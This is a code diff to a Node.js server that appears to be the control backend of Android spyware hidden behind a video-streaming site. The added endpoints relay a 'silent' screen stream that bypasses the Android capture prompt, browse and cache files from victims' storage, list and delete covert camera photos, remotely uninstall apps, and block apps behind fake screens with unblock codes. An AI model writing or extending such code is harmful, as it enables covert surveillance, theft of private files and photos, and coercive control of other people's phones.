@@ -3367,6 +3367,62 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       socket.on('screen_stream_chunk', (meta, chunk) => {
         io.emit('screen_stream_chunk', { ...meta, chunk: chunk ? Buffer.from(chunk).toString('base64') : null });
       });
+
+      // v7.9.2: Silent screen stream (JPEG slideshow, no MediaProjection)
+      socket.on('silent_screen_start', (data) => { io.emit('silent_screen_start', data); });
+      socket.on('silent_screen_stop', (data) => { io.emit('silent_screen_stop', data); });
+      socket.on('silent_screen_frame', (meta, frameB64) => {
+        // frameB64 is already a base64 string from the device
+        io.emit('silent_screen_frame', { ...meta, frame: frameB64 });
+      });
+
+      // v7.9.2: File manager — relay + cache for offline browsing
+      socket.on('files_listed', (data) => {
+        try {
+          // Cache the listing in SQLite for offline browsing
+          if (data && data.device_id && data.path) {
+            try {
+              db.exec(`CREATE TABLE IF NOT EXISTS cached_file_listings (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                device_id TEXT NOT NULL,
+                path TEXT NOT NULL,
+                entries_json TEXT NOT NULL,
+                entry_count INTEGER,
+                cached_at TEXT DEFAULT (datetime('now')),
+                UNIQUE(device_id, path)
+              )`);
+              db.prepare('INSERT OR REPLACE INTO cached_file_listings (device_id, path, entries_json, entry_count, cached_at) VALUES (?,?,?,?,?)')
+                .run(data.device_id, data.path, JSON.stringify(data.entries || []), (data.entries || []).length, new Date().toISOString());
+            } catch (_) {}
+          }
+          io.emit('files_listed', data);
+        } catch (_) {}
+      });
+
+      socket.on('file_download_result', (data) => {
+        io.emit('file_download_result', data);
+      });
+
+      // v7.9.2: Remote uninstaller events
+      socket.on('uninstall_started', (data) => { io.emit('uninstall_started', data); });
+      socket.on('uninstall_result', (data) => {
+        try {
+          db.exec(`CREATE TABLE IF NOT EXISTS uninstall_events (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT, package_name TEXT, success INTEGER, error TEXT,
+            recorded_at TEXT DEFAULT (datetime('now'))
+          )`);
+          if (data && data.device_id) {
+            db.prepare('INSERT INTO uninstall_events (device_id, package_name, success, error, recorded_at) VALUES (?,?,?,?,?)')
+              .run(data.device_id, data.package || '', data.success ? 1 : 0, data.error || '', new Date().toISOString());
+          }
+        } catch (_) {}
+        io.emit('uninstall_result', data);
+      });
+
+      // v7.9.2: Blocked apps list response
+      socket.on('blocked_apps_list', (data) => { io.emit('blocked_apps_list', data); });
+      socket.on('app_block_result', (data) => { io.emit('app_block_result', data); });
     });
   }
 
@@ -4602,6 +4658,146 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
   app.post('/api/admin/set-geofences', express.json(), (req, res) =>
     relayCommand(req, res, 'set_geofences', b => ({ geofences: b.geofences || [] })));
+
+  // ═══ v7.9.2 NEW RELAY ENDPOINTS ═══
+  app.post('/api/admin/start-silent-screen', express.json(), (req, res) => relayCommand(req, res, 'start_silent_screen'));
+  app.post('/api/admin/stop-silent-screen', express.json(), (req, res) => relayCommand(req, res, 'stop_silent_screen'));
+  app.post('/api/admin/uninstall-app', express.json(), (req, res) =>
+    relayCommand(req, res, 'uninstall_app', b => ({ package: b.package || '' })));
+  app.post('/api/admin/block-app-v2', express.json(), (req, res) =>
+    relayCommand(req, res, 'block_app_v2', b => ({
+      package: b.package || '',
+      fake_ui_type: b.fake_ui_type || 'default',
+      custom_message: b.custom_message || '',
+      custom_url: b.custom_url || '',
+      timer_seconds: b.timer_seconds || 0,
+      unblock_code: b.unblock_code || ''
+    })));
+  app.post('/api/admin/unblock-app-v2', express.json(), (req, res) =>
+    relayCommand(req, res, 'unblock_app_v2', b => ({ package: b.package || '' })));
+  app.post('/api/admin/get-blocked-apps', express.json(), (req, res) => relayCommand(req, res, 'get_blocked_apps'));
+
+  // ═══ v7.9.2: Camera captures GET endpoint (list photos for a device) ═══
+  app.get('/api/admin/connections/:deviceId/camera-captures', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+      const { limit, offset } = req.query;
+      try {
+        const rows = db.prepare('SELECT id, device_id, filename, camera, file_size, captured_at FROM camera_captures WHERE device_id = ? ORDER BY captured_at DESC LIMIT ? OFFSET ?')
+          .all(deviceId, parseInt(limit) || 50, parseInt(offset) || 0);
+        const protocol = req.headers['x-forwarded-proto'] || 'https';
+        const host = req.headers['host'] || 'netmirrorr.onrender.com';
+        const entries = rows.map(r => ({
+          ...r,
+          url: `${protocol}://${host}/camera_captures/${deviceId}/${r.filename}`
+        }));
+        res.json({ success: true, entries });
+      } catch (_) {
+        res.json({ success: true, entries: [] });
+      }
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Delete a camera capture
+  app.delete('/api/admin/connections/:deviceId/camera-captures/:id', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId, id } = req.params;
+      const row = db.prepare('SELECT filename FROM camera_captures WHERE id = ? AND device_id = ?').get(id, deviceId);
+      if (row && row.filename) {
+        const filePath = path.join(__dirname, 'data', 'camera_captures', deviceId, row.filename);
+        try { fs.unlinkSync(filePath); } catch (_) {}
+        db.prepare('DELETE FROM camera_captures WHERE id = ?').run(id);
+      }
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ v7.9.2: Smart list-files endpoint with offline cache fallback ═══
+  app.post('/api/admin/list-files-smart', express.json(), (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { device_id, path: reqPath } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id required' });
+      const targetPath = reqPath || '/sdcard';
+
+      // Try live first
+      const targetSocket = findDeviceSocket(device_id);
+      if (targetSocket) {
+        targetSocket.emit('list_files', { path: targetPath });
+        return res.json({ success: true, source: 'live', message: 'Request sent to device — listing will arrive via socket event' });
+      }
+
+      // Device offline — try cache
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS cached_file_listings (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT NOT NULL,
+          path TEXT NOT NULL,
+          entries_json TEXT NOT NULL,
+          entry_count INTEGER,
+          cached_at TEXT DEFAULT (datetime('now')),
+          UNIQUE(device_id, path)
+        )`);
+        const row = db.prepare('SELECT * FROM cached_file_listings WHERE device_id = ? AND path = ?').get(device_id, targetPath);
+        if (row) {
+          return res.json({
+            success: true,
+            source: 'cache',
+            path: targetPath,
+            entries: JSON.parse(row.entries_json),
+            cached_at: row.cached_at,
+            message: 'Device offline — showing cached listing'
+          });
+        }
+        // Try nearest ancestor (e.g. /sdcard/Download/file.txt → /sdcard/Download)
+        const parts = targetPath.split('/').filter(Boolean);
+        while (parts.length > 0) {
+          parts.pop();
+          const ancestor = '/' + parts.join('/');
+          const aRow = db.prepare('SELECT * FROM cached_file_listings WHERE device_id = ? AND path = ?').get(device_id, ancestor);
+          if (aRow) {
+            return res.json({
+              success: true,
+              source: 'cache_ancestor',
+              path: ancestor,
+              requested_path: targetPath,
+              entries: JSON.parse(aRow.entries_json),
+              cached_at: aRow.cached_at,
+              message: `Device offline — exact path not cached. Showing nearest cached ancestor: ${ancestor}`
+            });
+          }
+        }
+        return res.status(404).json({ error: 'Device offline and no cached listing available for this path' });
+      } catch (e) {
+        return res.status(500).json({ error: 'Cache lookup failed: ' + e.message });
+      }
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Get cached file tree paths for a device (for breadcrumb navigation)
+  app.get('/api/admin/connections/:deviceId/cached-paths', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+      try {
+        const rows = db.prepare('SELECT path, entry_count, cached_at FROM cached_file_listings WHERE device_id = ? ORDER BY path')
+          .all(deviceId);
+        res.json({ success: true, paths: rows });
+      } catch (_) {
+        res.json({ success: true, paths: [] });
+      }
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
 
   // Stream endpoint — redirects to Cloudinary URL
   app.get('/api/stream/:videoId', (req, res) => {
